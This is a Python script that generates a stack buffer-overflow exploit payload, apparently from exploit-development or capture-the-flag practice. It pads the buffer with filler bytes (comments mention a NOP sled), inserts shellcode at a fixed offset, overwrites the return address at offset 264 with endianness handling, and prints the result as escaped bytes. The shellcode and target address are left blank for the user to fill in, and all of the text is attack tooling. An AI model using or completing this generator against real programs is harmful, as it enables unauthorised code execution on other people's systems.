total_length     = 268
# pre_filler_char  = b"\x90" # NOP sled --> will make slide until the closest shellcode
pre_filler_char  = b"\x41" # A char --> inc ecx (de facto slider)
post_filler_char = b"\x42" # B char --> inc edx (de facto slider)

shellcode        = b"" # must be already compiled for the target machine (won't be altered by the specified endianness)
shellcode_offset = 200

address_offset    = 264
address           = b"" # big endian representation

arch_bit          = len(address) * 8
endianness        = 'little'

address           = address if endianness == 'big' else reversed(address)

def build_payload(apply_offset_to_address = False) -> str:
    global address
    
    ret = [int.from_bytes(pre_filler_char, endianness)] * shellcode_offset + \
          [int.from_bytes(post_filler_char, endianness)] * (total_length - shellcode_offset)
    
    if apply_offset_to_address:
        address = (
            int.from_bytes(address, endianness) - shellcode_offset
        ).to_bytes(arch_bit // 8, endianness)
    
    for i, b in enumerate(shellcode, shellcode_offset):
        ret[i] = b
    
    for i, b in enumerate(address, address_offset):
        ret[i] = b

    return "".join(
        "\\x{:02x}".format(b)
        for b in ret
    )

print(f'"{build_payload()}"')
